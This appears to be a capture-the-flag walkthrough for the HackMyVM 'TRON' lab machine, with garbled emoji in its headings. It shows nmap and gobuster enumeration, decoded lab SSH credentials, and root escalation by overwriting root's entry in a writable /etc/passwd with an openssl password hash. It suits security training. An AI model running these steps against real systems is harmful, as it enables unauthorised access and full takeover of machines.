üß© TRON Machine Walkthrough ‚Äì HackMyVM
Difficulty: Easy
Goal: Gain user access via a series of encrypted clues and escalate to root by exploiting a writable /etc/passwd.
Target IP: 192.168.1.136
Test Date: 10/04/2025

üîç Initial Enumeration
Full TCP port scan:

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.136
Service and version detection on discovered ports:

nmap -sCV -p22,80 192.168.1.136
Discovered open ports:

22/tcp ‚Äì OpenSSH 7.9p1

80/tcp ‚Äì Apache httpd 2.4.38

üß≠ Web Enumeration and Clue Extraction
A Gobuster scan revealed multiple endpoints:

gobuster dir -u http://192.168.1.136/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt -t 100 -k -r
Relevant findings:

/robots.txt

/MCP

/tron.txt ‚Üí Contained Base64-encoded Brainfuck code

Decoded /tron.txt revealed:

Brainfuck output: player

Further clue in /30513.txt:

Reversed substitution cipher used

HTML source of the main page included:

<!-- kzhh:SbWP9q94ZtE9qD -->
Using the cipher, the password for player was decoded as:

SyWP9j94ZgE9jD

üîë Initial Access via SSH
SSH login with valid credentials:

ssh player@192.168.1.136
# Password: SyWP9j94ZgE9jD
Access successful. Retrieved:

user.txt ‚Üí HMVMuserplayer2021

‚¨ÜÔ∏è Privilege Escalation via Writable /etc/passwd
Writable files were identified:

find /etc -type f -writable 2>/dev/null
Confirmed /etc/passwd was writable. A new password hash was created:

openssl passwd hola
# Result: 2w0G/hIEd5E42
The /etc/passwd file was edited to replace root‚Äôs line:

root:2w0G/hIEd5E42:0:0:root:/root:/bin/bash
Switched to root with the new password:

su root
# Password: hola
Access granted with full root privileges.

üéØ Conclusion
The TRON machine was compromised through a creative combination of web-based clue decoding and poor file permission management. The writable /etc/passwd allowed for a manual password injection, granting root access without the need for kernel-level exploits.

This highlights how even seemingly minor misconfigurations, such as writable critical system files, can lead to a full system compromise when combined with clever reconnaissance and decoding skills.
